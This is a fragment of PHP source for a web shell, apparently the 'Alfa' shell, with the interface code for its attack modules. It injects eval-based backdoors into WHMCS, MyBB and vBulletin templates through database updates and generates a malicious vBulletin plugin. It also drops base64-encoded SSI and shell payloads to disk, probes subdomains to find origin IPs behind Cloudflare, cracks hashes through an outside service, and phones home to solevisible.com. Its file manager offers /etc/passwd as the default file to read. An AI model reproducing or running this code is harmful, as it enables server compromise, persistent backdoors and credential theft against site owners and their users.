$array = array('username' => trim($user),'password' => trim($pw),'port' => trim($port),'target' => trim($target),'protocol' => trim($protocol),'fcrack' => trim($fcrack),'mysql' => $p);
Alfa_Call_Function_Cracker($loginpanel,$array);
}
}
echo '<br><font color="red">Attack Finished...</font>';
}
echo '</div>';
alfafooter();
}
function output($string){ echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$string."'>Click Here !</a></font></b></center><br><br>";}
function alfaShellInjectors(){
alfahead();
echo '<div class=header>';
AlfaNum(11);
echo '<center><p><div class="txtfont_header">| Cms Shell Injector |</div></p><center><h3><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,\'whmcs\',null)">| WHMCS | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,\'mybb\')">| MyBB | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,null,\'vb\')">| vBulletin |</a></h3></center>';
$selector = '<p><div class="txtfont">Shell Inject Method : </div> <select name="method" style="width:100px;"><option value="auto">AutoMatic</option><option value="man">Manuel</option></select></p>';
if(isset($_POST['alfa1']) && $_POST['alfa1']== 'whmcs'){
AlfaNum();
echo __pre()."<p><div class='txtfont_header'>| WHMCS |</div></p><center><center><p>".getConfigHtml('whmcs')."</p><form onSubmit=\"g('ShellInjectors',null,'whmcs',null,null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.path.value); return false;\" method='post'>";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Path WHMCS Url : ', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host : ', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name : ', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User : ', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass : ', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
);
create_table($table);
echo $selector;
echo "<p><input type='submit' value=' '></p></form></center></td></tr></table></center>";
if(isset($_POST['alfa6'])) {
$dbu = $_POST['alfa6'];
$dbn = $_POST['alfa7'];
$dbp = $_POST['alfa8'];
$dbh = $_POST['alfa9'];
$path = $_POST['alfa10'];
$method = $_POST['alfa4'];
$index = "{php}".ALFA_UPLOADER.";{/php}";
$newin = str_replace("'","\'",$index);
$newindex = "<p>Dear $newin,</p><p>Recently a request was submitted to reset your password for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
if(!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)){
if(filter_var($path,FILTER_VALIDATE_URL)){
$conn = mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_connect_error());
$soleSave= mysqli_query($conn,"select message from tblemailtemplates where name='Password Reset Validation'");
$soleGet = mysqli_fetch_assoc($soleSave);
$tempSave1 = $soleGet['message'];
$tempSave = str_replace("'","\'",$tempSave1);
mysqli_query($conn,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die (mysqli_error($conn));
$inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE name='Password Reset Validation'";
$result = mysqli_query($conn,$inject) or die (mysqli_error($conn));
$create = "insert into tblclients (email) values('solevisible@fbi.gov')";
$result2 = mysqli_query($conn,$create) or die (mysqli_error($conn));
if(function_exists('curl_version') && $method == 'auto'){
$AlfaSole = new AlfaCURL(true);
$saveurl = $AlfaSole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$AlfaSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
__alert("shell injectet...");
$ff= 'http://'.$path."/solevisible.php";
output($ff);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>solevisible@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/solevisible.php' target='_blank'>".$path."/solevisible.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
}if(isset($_POST['alfa2']) && $_POST['alfa2']== 'mybb'){
AlfaNum(1,2,3,5);
echo __pre()."<p><div class='txtfont_header'>| MyBB |</div></p><center><center>".getConfigHtml("mybb")."<form id='sendajax' onSubmit=\"g('ShellInjectors',null,null,'mybb',null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.prefix.value); return false;\" method=POST>
";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'dbh', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'dbn', 'id'=>'db_name' ,'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'dbu', 'id'=>'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'dbp', 'id'=>'db_pw', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'prefix', 'id'=>'db_prefix','inputValue' => 'mybb_', 'inputSize' => '50')
);
create_table($table);
echo $selector;
echo "<p><input type=submit value=' '></p></form></center></center>";
if(isset($_POST['alfa6'])) {
$dbu = $_POST['alfa6'];
$dbn = $_POST['alfa7'];
$dbp = $_POST['alfa8'];
$dbh = $_POST['alfa9'];
$prefix = $_POST['alfa10'];
$method = $_POST['alfa4'];
$shellCode = "{\${".ALFA_UPLOADER."}}";
$newinshell = str_replace("'","\'",$shellCode);
if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($newinshell)){
$conn = mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
$inject = "select template from {$prefix}templates where  title= 'calendar'";
$result = mysqli_query($conn, $inject) or die (mysqli_error($conn));
$GetTemp = mysqli_fetch_assoc($result);
$saveDate = $GetTemp['template'];
$repsave = str_replace($shellCode,"",$saveDate);
$repsave = str_replace("'","\'",$repsave);
$createShell = "update {$prefix}templates SET template= '".$newinshell.$repsave."' where title = 'calendar'";
$result2 = mysqli_query($conn,$createShell) or die (mysqli_error($conn));
$geturl = "select value from {$prefix}settings where name= 'bburl'";
$findurl = mysqli_query($conn,$geturl) or die (mysqli_error($conn));
$rowb = mysqli_fetch_assoc($findurl);
$furl = $rowb['value'];
$realurl = parse_url($furl,PHP_URL_HOST);
$realpath = parse_url($furl,PHP_URL_PATH);
$res = false;
$AlfaCurl = new AlfaCURL();
if (extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto' ){
if ($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
@fputs($fsock, "GET $realpath/calendar.php HTTP/1.1\r\n");
@fputs($fsock, "HOST: $realurl\r\n");
@fputs($fsock, "Connection: close\r\n\r\n");
$check = fgets($fsock);
if(preg_match("/200 OK/i",$check)){
$repairdbtemp = "update {$prefix}templates SET template= '$repsave' where title = 'calendar'";
$clear = mysqli_query($conn,$repairdbtemp) or die (mysqli_error($conn));$res = true;}
@fclose($fsock);}}elseif(function_exists('curl_version') && $method == 'auto'){
$AlfaCurl->Send($realurl.$realpath."/calendar.php");
$res = true;
}
if($res){
$ff = 'http://'.$realurl.$realpath."/solevisible.php";
output($ff);
}else{
$ff = 'http://'.$realurl.$realpath."/calendar.php";
$fff = 'http://'.$realurl.$realpath."/solevisible.php";
echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#FFFFFF'>Please Go To Target => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color='#FFFFFF'>And Go To => </font><a href='".$fff."' target='_blank'>".$fff."</a></b></center><br><br>";
}}}}
if(isset($_POST['alfa3']) && $_POST['alfa3']== 'vb'){
AlfaNum(1,2,7,9,10);
echo __pre().'<p><div class="txtfont_header">| vbulletin |</div></p><p>'.getConfigHtml('vb').'</p><form name="frm" method="POST" onsubmit="g(\'ShellInjectors\',null,null,this.lo.value,\'vb\',this.user.value,this.pass.value,this.tab.value,this.db.value,this.method.value); return false;">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'lo', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'db', 'id'=>'db_name','inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'user', 'id'=>'db_user','inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'pass', 'id'=>'db_pw','inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'tab', 'id'=>'db_prefix','inputValue' => '', 'inputSize' => '50')
);
create_table($table);
echo $selector;
echo '<p><input type="submit" value=" " /></p></form></center>';
if(isset($_POST['alfa4'])&&!empty($_POST['alfa4'])){
$method = $_POST['alfa8'];
$faq_name = "faq";
$faq_file = "/faq.php";
$code = "{\${".ALFA_UPLOADER."}}{\${exit()}}&";
$conn=@mysqli_connect($_POST['alfa2'],$_POST['alfa4'],$_POST['alfa5'],$_POST['alfa7']) or die(@mysqli_connect_error());
$rec = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$faq_name."'";
$recivedata = @mysqli_query($conn,$rec);
$getd = @mysqli_fetch_assoc($recivedata);
$savetoass = $getd['template'];
if(empty($savetoass)){
	$faq_name = "header";
	$faq_file = "/";
	$rec = "select `template` from ".$_POST['alfa6']."template WHERE title ='".$faq_name."'";
	$recivedata= @mysqli_query($conn,$rec);
	$getd = @mysqli_fetch_assoc($recivedata);
	$savetoass = $getd['template'];
	$code = ALFA_UPLOADER.";";
}
$code = str_replace("'","\'",$code);
$p = "UPDATE ".$_POST['alfa6']."template SET `template`='".$code."' WHERE `title`='".$faq_name."'";
$ka= @mysqli_query($conn,$p) or die(mysqli_error($conn));
$geturl = @mysqli_query($conn,"select `value` from ".$_POST['alfa6']."setting WHERE `varname`='bburl'");
$getval = @mysqli_fetch_assoc($geturl);
$saveval = $getval['value'];
if($faq_name == "header"){
	if(substr($saveval, -5, 5) == "/core"){
		$saveval = substr($saveval, 0, -5);
	}
}
$realurl = parse_url($saveval,PHP_URL_HOST);
$realpath = parse_url($saveval,PHP_URL_PATH);
$res = false;
$AlfaCurl = new AlfaCURL();
if(extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto'){
if($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
@fputs($fsock, "GET $realpath.$faq_file HTTP/1.1\r\n");
@fputs($fsock, "HOST: $realurl\r\n");
@fputs($fsock, "Connection: close\r\n\r\n");
$check = fgets($fsock);
if(preg_match("/200 OK/i",$check)){
$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
$res = true;
}
@fclose($fsock);
}
}elseif(function_exists('curl_version') && $method == 'auto'){
$AlfaCurl->Send($realurl.$realpath.$faq_file);
$p1 = "UPDATE ".$_POST['alfa6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
$res = true;
}
if($res){
$ff = 'http://'.$realurl.$realpath."/solevisible.php";
output($ff);
}else{
$ff = 'http://'.$realurl.$realpath.$faq_file;
$fff = 'http://'.$realurl.$realpath."/solevisible.php";
echo "<center><p><font color=\"#FFFFFF\">First Open This Link => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color=\"#FFFFFF\">Second Open This Link => </font><a href='".$fff."' target='_blank'>".$fff."</a></center></p>";}}}
echo '</div>';
alfafooter();
}
function alfacheckfiletype(){
	$path = $_POST['path'];
	$arg = $_POST['arg'];
	if(@is_file($path.'/'.$arg)){
		echo("file");
	}else{
		echo("dir");
	}
}
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["alfacgiapi_mode"])&&!isset($_COOKIE["alfacgiapi"])){
			_alfa_cgicmd("whoami","perl",true);
			if(strlen(alfaEx("whoami",false,true))>0){
				__alfa_set_cookie("alfa_canruncmd", "true");
			}
		}
	}
	if(function_exists("curl_version")){
		$update = new AlfaCURL();
		$json = $update->Send("http://solevisible.com/update.json?ver=".__ALFA_VERSION__);
		$json = @json_decode($json,true);
		$data = array();
		if($json){
			if(!isset($_COOKIE['alfa_checkupdate']) && !empty($json["type"])){
				if($json["type"] == "update"){
					if(__ALFA_VERSION__ != $json['version'] || __ALFA_UPDATE__ != $json['version_number']){
						@setcookie("alfa_checkupdate", "1", time()+86400);
						$data["content"] = '<div class="update-holder">'.$json["content"].'</div>';
					}
				}
			}
			if(isset($json["ads"]) && !empty($json["ads"])){
				$data["content"] .= $json["ads"];
			}
			if(isset($json["copyright"]) && !empty($json["copyright"])){
				$data["copyright"] = $json["copyright"];
			}
			if(isset($json["solevisible"]) && !empty($json["solevisible"])){
				$data["solevisible"] = $json["solevisible"];
			}
			if(isset($json["code_name"]) && !empty($json["code_name"])){
				$data["code_name"] = $json["code_name"];
				$data["version_number"] = __ALFA_VERSION__;
			}
			if(isset($json["market"]) && !empty($json["market"])){
				$data["market"] = $json["market"];
			}
			echo @json_encode($data);
		}
	}
}
function alfaWriteTocgiapi($name, $source){
	$temp = "";
	$not_api = array("basedir.alfa", "getdir.alfa", "getheader.alfa");
	if(in_array($name, $not_api)){
		$temp = ALFA_TEMPDIR;
		if($temp){
			@chdir($temp);
		}
	}else{
		alfaCreateParentFolder();
		@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
	}
	@mkdir('alfacgiapi',0755);
	__write_file("alfacgiapi/".$name, __get_resource($source));
	@chmod("alfacgiapi/".$name, 0755);
	return $temp;
}
function alfacheckcgi(){if(strlen(alfaEx("id",false,true,true))>0)echo("ok");else echo("no");}
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		$bash = "zZRdb9owFIavya849dIGJLK0vVyFNFTohERBgtFdQIRM4hAL40R2UkYp/312gPARqLqbaYnyIfs8x+85r+UvV04qhTOh3JGhMeg3nwbtWnnqecDUoz8+zPGMQBzGEBPBIF4mYcRBpJMlJFjA9I3GMNm+MAvwPXCFRR5OCMiU+pqqGI3ur067W280e/1aeTElCQQk8UJgS/4bGOUzCV6q0usZtojtORUiEhWDeGEENgFrhVJJgpShb8ORZxlBJIAC5WCuNqqH3931A/iRAepahNQLa2Y5+4JJK0ZpOIQrsN8AmdkgAteFmxvY5R8hk45Q1VK5q4YfcZKvjEbqdqsjD+3FID9acBZhn4iinoNS/62olOM5UXqQZZazf7AxvKu+JmB7d/bd/W3FyiDrEJJEUH9LyQTrWEDXKQzhegAuUtpu0RluKqI0PgNONfjjA9CP5phyqUE98dLq/RzU2+NG97ne6vRryFH7wnmlIkkxczbBqtlESGR06s/Nxvix23nahuki/a9exANkvNTbrXq/mWfAjGJJpKNneuMMVVOvWGwoNU4DUAbobponKrQRD5CEhBulbZT4OKq0K9As48UMrGansYoF5Ql0emsLTtEK7PqgLYQSYftljhpwYQ0mC3HvsPDAZseZjxKb+/79jfQ9VcgtyQGOHrFiegT7aguc2ANuRgTUyAWRgiC99XNDtm4Wx7deXrLogLvQt4OYsz07duP8isWUedB/7sOnXbgs9KT2w6CzxW/0fX6baH35ceGu1SnxBw==";
		$realdir = addslashes(dirname($_SERVER["SCRIPT_FILENAME"]));
		$tmp_path = alfaWriteTocgiapi("getheader.alfa",$bash);
		$data = alfaEx("cd '{$tmp_path}/alfacgiapi';sh getheader.alfa",false,true,true);
		if(@is_array(@json_decode($data,true))){
			__alfa_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
			echo $data;
		}
	}else{
		echo __ZGVjb2Rlcg($_COOKIE["updateheader_data"]);
	}
}
function alfassiShell(){
alfahead();
echo '<div class=header>';
alfaCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __ALFA_DATA_FOLDER__);
@mkdir('alfa_shtml',0755);
@chdir('alfa_shtml');
alfacgihtaccess('shtml');
$code = 'rVb9b9s2EP1Xrky22MhsKcu6ptbH0A+vzYbCXeztl6YoZImS2VCkQFJOvCX/+46SrChOnKRBA8ORyOPju3ePR/vPBoOdWIqUZUCVynUWkE9jpaT6TAaD0O9Ma/YvTXMTkPnKUN3OshToRaEC0jslu+9ns49f3kwmfx6PTwkEcEpOSR8uL8FOnoz/+ns8nX35MJ69n7zF+Wc24N14hjEE1niaGlhGiKcXnOATL2lAuIYBj66DKNf03hVdJterRIJs8Q2+C/OPk+kW6kzELXVnOLzjQ03sFJHW58lDSXWwNpOCzawWJuehv6BREvqGGU7DVzyNYEajHKbTY5guKOe+U0/5OlasMMAjkZVRhlS/RsuoHiRhWorYMCkgkcz0IJcJhT78x9IejsRlToUZxlKeMWrFIMROIl+oxzQquBE21AW3SMTDWC+VqmfzA4aRrof//PXSIaciMwsP9vcZ9Dc3C9Zhn3DNZ9hHPCwiU1QHs0X5E7gH8Eck4ODlCxdcd1R94N2HGfGubkO1Ixk1Y07t4+vVcbJOd1jJ7rVRXMaR1WSoKJdR0ut7V61MRmYZpz1giVViO7KdH2qz4nSYMJQkWiGP3jeFo9xCCor2/A3IHEmdERg1Y96V79QlDH2nNsJcJiuQwjIOyLaN9mKZ55FI9vrDFEM05kZgnsWSS/Tgjlv9EYg4E2fYAVAWNGXnBbdRoZ+wZejHiEnxZXEY+qkUBtYgz1/G8eEhCS/hDlfCpe/YaEsbFzprFAvbPod+2WDaZhSQ/QOCmcWcxcijqcAeFcs9y75SLSBxqbRUo0IyC+JVZEaKJh4Jx2LJlLQaABOpbAngJs68wwHTwkIEBJFb2KYaI6t6A7rz64tXr9/+7jViFIrWR7lQdmuxtEfbqUbttFOJVX/f0u5xmWK/e2Smb+rqAh470HUT2JJrTchmjLXOBKJWEwTOWWIWATlw3R/QGVIlFGuKlrDCVI23YTGP4rNMyVIkg0aW2jzezZ57/31QNcUbEt9sdY3E8w2H1QWwhUXK0Fi6TXUejn4Uc1143W8EUDnk1CwkJoKnwuqsy3nOjD0t2LGuj4atLBNFacCsCkzV0AsMrwt01EjRBJOwge/G17DtzXBSCgR0LIFbPt8o/WaCJ1SX3HQyu3lgLLFI0ahzgukv1E2OKiSNVfwZQZU8t4/PSXP9XNAY4jwJdrGc1T3krHHwaql8AX5r129zKl5ij3TqpKCqarIaUSBlnOoHz2V1RT7Srt/JpfXdX9m0Rny6Wf9h9LxKFHrYjkwZcexGMS8T2h91KvyQdQup7/Du0gLf69wjt9KwCnySa7flNUX0BxLYtrTSL7X0oJEk2EVNrJj1yuonaNf+T3Z9I/WtfTrmv9WuHXul2ovK/tz6Hw==';
@__write_file('alfa_ssi.shtml',__get_resource($code));
@chmod("alfa_ssi.shtml",0755);
echo AlfaiFrameCreator('alfa_shtml/alfa_ssi.shtml');
echo '</div>';
alfafooter();
}
function alfacloudflare(){
alfahead();
AlfaNum(8,9,10,7,6,5,4,3);
echo "<div class=header><center><br><div class='txtfont_header'>| Cloud Flare ByPasser |</div><br><form action='' onsubmit=\"g('cloudflare',null,this.url.value,'>>'); return false;\" method='post'>
<p><div class='txtfont'>Target:</div> <input type='text' size=30 name='url' style='text-align:center;' placeholder=\"target.com\"> <input type='submit' name='go' value=' ' /></p></form></center>";
if($_POST['alfa2'] && $_POST['alfa2'] == '>>'){
$url = $_POST['alfa1'];
if(!preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url)){
$url = preg_replace('/^(https?):\/\//', '', $url);
$url = "http://www.".$url;
}
$headers = @get_headers($url, 1);
$server = $headers['Server'];
$subs = array('owa.','2tty.','m.','gw.','mx1.','store.','1','2','vb.','news.','download.','video','cpanel.', 'ftp.', 'server1.', 'cdn.', 'cdn2.', 'ns.', 'ns3.', 'mail.', 'webmail.', 'direct.', 'direct-connect.', 'record.', 'ssl.', 'dns.', 'help.', 'blog.', 'irc.', 'forum.', 'dl.', 'my.', 'cp.', 'portal.', 'kb.', 'support.','search.', 'docs.', 'files.', 'accounts.', 'secure.', 'register.', 'apps.', 'beta.', 'demo.', 'smtp.', 'ns2.', 'ns1.', 'server.', 'shop.', 'host.', 'web.', 'cloud.', 'api.', 'exchange.', 'app.', 'vps.', 'owa.', 'sat.', 'bbs.', 'movie.', 'music.', 'art.', 'fusion.', 'maps.', 'forums.', 'acc.', 'cc.', 'dev.', 'ww42.', 'wiki.', 'clients.', 'client.','books.','answers.','service.','groups.','images.','upload.','up.','tube.','users.','admin.','administrator.','private.','design.','whmcs.','wp.','wordpress.','joomla.','vbulletin.','test.','developer.','panel.','contact.');
if(preg_match('/^(https?):\/\/(w{3}|w3)\./i', $url, $matches)){
if($matches[2] != 'www'){$url = preg_replace('/^(https?):\/\//', '', $url);}else{
$url = explode($matches[0], $url);
$url = $url[1];}}
if(is_array($server))$server = $server[0];
echo __pre();
if(preg_match('/cloudflare/i', $server))
echo "\n[+] CloudFlare detected: {$server}\n<br>";
else
echo "\n[+] CloudFlare wasn't detected, proceeding anyway.\n";
echo '[+] CloudFlare IP: ' . is_ipv4(gethostbyname($url)) . "\n\n<br><br>";
echo "[+] Searching for more IP addresses.\n\n<br><br>";
for($x=0;$x<count($subs);$x++){
$site = $subs[$x] . $url;
$ip = is_ipv4(gethostbyname($site));
if($ip == '(Null)')
continue;
echo "Trying {$site}: {$ip}\n<br>";
}
echo "\n[+] Finished.\n<br>";
}
echo '</div>';
alfafooter();
}
function is_ipv4($ip){
return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4) ? $ip : '(Null)';
}
function __alert($s){
echo '<center>'.__pre().$s.'</center>';
}
function create_table($data){
echo '<table border="1">';
foreach ($data as $key => $val){
$array = array();
foreach($val as $k => $v){
$array[$k] = $v;
}
echo "<tr><td><div class='tbltxt'>".$array['tdName']."</div></td><td><input type='text' id='".$array['id']."' name='".$array['inputName']."' ".($array['placeholder']?'placeholder':'value')."='".$array['inputValue']."' size='".$array['inputSize']."' ".($array['disabled']?'disabled':'')."></td></tr>";
}
echo '</table>';
}
function alfaphp2xml(){
alfahead();
AlfaNum(8,9,10,7,6,5,4,3);
echo "<div class=header><center><p><div class='txtfont_header'>| Shell For vBulletin |</div></p><form onsubmit=\"g('php2xml',null,this.code.value,'>>'); return false;\" method='post'>
<p><br><textarea rows='12' cols='70' type='text' name='code' placeholder=\"insert your shell code\"></textarea><br/><br/>
<input type='submit' name='go' value=' ' /></p></form></center>";
if($_POST['alfa2']&&$_POST['alfa2']=='>>'){
echo __pre()."<p><center><textarea rows='10' name='users' cols='80'>";
echo '<?xml version="1.0" encoding="ISO-8859-1"?><plugins><plugin active="1" product="vbulletin"><title>vBulletin</title><hookname>init_startup</hookname><phpcode><![CDATA[if (strpos($_SERVER[\'PHP_SELF\'],"subscriptions.php")){eval(base64_decode(\''.__ZW5jb2Rlcg($_POST['alfa1']).'\'));exit;}]]></phpcode></plugin></plugins>';
echo '</textarea></center></p>';
}
echo '</center></div>';
alfafooter();
}
function alfacpcrack(){
alfahead();
echo '<div class=header><center><p><div class="txtfont_header">| Hash Tools |</div></p><h3><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'dec\')">| DeCrypter | </a><a href=javascript:void(0) onclick="g(\'cpcrack\',null,\'analyzer\')">| Hash Analyzer | </a></h3></center>';
if($_POST['alfa1']=='dec'){
$algorithms = array('md5'=>'MD5','md4'=>'MD4','sha1'=>'SHA1','sha256'=>'SHA256','sha384'=>'SHA384','sha512'=>'SHA512','ntlm'=>'NTLM');
echo '<center><div class="txtfont_header">| DeCrypter |</div><br><br>
<form onsubmit="g(\'cpcrack\',null,\'dec\',this.md5.value,\'>>\',this.alg.value); return false;"><div class="txtfont">Decrypt Method:</div> <select name="alg" style="width:100px;">';
foreach($algorithms as $key=>$val){echo('<option value="'.$key.'">'.$val.'</option>');}
echo'</select><input type="text" placeholder="Hash" name="md5" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
if($_POST['alfa3'] == '>>'){
$hash = $_POST['alfa2'];
if(!empty($hash)){
$hash_type = $_POST['alfa4'];
$email = "solevisible@gmail.com";
$code = "7b9fa79f92c3cd96";
$target = "https://md5decrypt.net/Api/api.php?hash=".$hash."&hash_type=".$hash_type."&email=".$email."&code=".$code;
$resp = @file_get_contents($target);
if($resp==''){
$get = new AlfaCURL();
$resp = $get->Send($target);
}
echo __pre().'<center>';
switch($resp){
	case('CODE ERREUR : 001'):echo "<b><font color='red'>You exceeded the 400 allowed request per day</font></b>";break;
	case('CODE ERREUR : 003'):echo "<b><font color='red'>Your request includes more than 400 hashes.</font></b>";break;
	case('CODE ERREUR : 004'):echo "<b><font color='red'>The type of hash you provide in the argument hash_type doesn't seem to be valid</font></b>";break;
	case('CODE ERREUR : 005'):echo "<b><font color='red'>The hash you provide doesn't seem to match with the type of hash you set.</font></b>";break;
}
if(substr($resp,0,4)!='CODE'&&$resp!=''){
echo "<b>Result: <font color='green'>".$resp."</font></b>";
}elseif(substr($resp,0,4)!='CODE'){
echo "<font color='red'>NoT Found</font><br />";
}
echo('</center>');
}
}
}
if($_POST['alfa1']=='analyzer'){
echo '<center><p><div class="txtfont_header">| Hash Analyzer |</div></p>
<form onsubmit="g(\'cpcrack\',null,\'analyzer\',this.hash.value,\'>>\');return false;">
<div class="txtfont">Hash: </div> <input type="text" placeholder="Hash" name="hash" size="60" id="text" /> <input type="submit" value=" " name="go" /></form></center><br>';
if($_POST['alfa3'] == '>>'){
$hash = $_POST['alfa2'];
if(!empty($hash)){
$curl = new AlfaCURL();
$resp = $curl->Send("https://md5decrypt.net/en/HashFinder/","post","hash={$hash}&crypt=Search");
echo(__pre().'<center>');
if(preg_match('#<fieldset class="trouve">(.*?)</fieldset>#',$resp,$s)){
	echo('<font color="green">'.$s[1].'</font>');
}else{
	echo('<font color="red">Not Found...!</font>');
}
echo('</center><br>');
}
}
}
echo '</div>';
alfafooter();
}
function alfafooter(){
if(!isset($_POST['ajax'])){
echo "<table class='foot' width='100%' border='0' cellspacing='3' cellpadding='0' >
<tr>
<td width='17%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'mkfile','','','','file');this.f.value='';return false;\"><span class='footer_text'>Make File : </span><br><input class='dir' type='text' name='f' value=''> <input type='submit' value=' '></form></td>
<td width='21%'><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);this.d.value='';return false;\"><span class='footer_text'>Make Dir : </span><br><input class='dir' type='text' name='d' value=' '> <input type='submit' value=' '></form></td>
<td width='22%'><form onsubmit=\"g('FilesMan',null,'delete',this.del.value);this.del.value='';return false;\"><span class='footer_text'>Delete : </span><br><input class='dir' type='text' name='del' value=' '> <input type='submit' value=' '></form></td>
<td width='19%'><form onsubmit=\"if(this.f.value.trim().length==0)return false;editor(this.f.value,'chmod','','','','none');this.f.value='';return false;\"><span class='footer_text'>Chmod : </span><br><input class='dir' type=text name=f value=' '> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='2'><form onsubmit='g(\"FilesMan\",this.c.value,\"\");return false;'><span class='footer_text'>Change Dir : </span><br><input class='foottable' id='footer_cwd' type='text' name='c' value='".htmlspecialchars($GLOBALS['cwd'])."'> <input type='submit' value=' '></form></td>
<td colspan='2'><form onsubmit=\"editor(this.file.value,'view','','','','file');return false;\"><span><span class='footer_text'>Read File : </span></span><br><input class='foottable' type='text' name='file' value='/etc/passwd'> <input type='submit' value=' '></form></td>
</tr>
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='alfaOpenPhpTerminal();return false;' class='foottable alfa_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
<td colspan='4'><form onsubmit='u(this);return false;' name='footer_form' method='post' ENCTYPE='multipart/form-data'>
<input type='hidden' name='a' value='FilesMAn'>
<input type='hidden' name='c' value='" . $GLOBALS['cwd'] ."'>
<input type='hidden' name='ajax' value='true'>
<input type='hidden' name='alfa1' value='uploadFile'>
